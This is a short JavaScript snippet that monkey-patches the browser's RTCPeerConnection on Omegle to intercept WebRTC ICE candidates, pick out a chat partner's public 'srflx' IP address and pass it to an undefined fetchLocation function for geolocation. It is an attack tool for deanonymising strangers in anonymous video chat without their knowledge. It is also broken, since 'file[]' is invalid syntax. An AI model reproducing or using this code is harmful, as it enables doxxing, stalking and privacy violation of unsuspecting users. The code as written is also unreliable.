oRTCPeerConnection  = RTCPeerConnection

RTCPeerConnection = function(...args) {
	const omegleLocator = new oRTCPeerConnection(...args)

	omegleLocator.oaddIceCandidate = omegleLocator.addIceCandidate

	omegleLocator.addIceCandidate = function(iceCandidate) {
		const file = iceCandidate.candidate.split(' ')
		if (file[7] === 'srflx') {
			console.clear()
			fetchLocation(file[])
		}
		return omegleLocator.oaddIceCandidate(iceCandidate)
	}

	return omegleLocator
}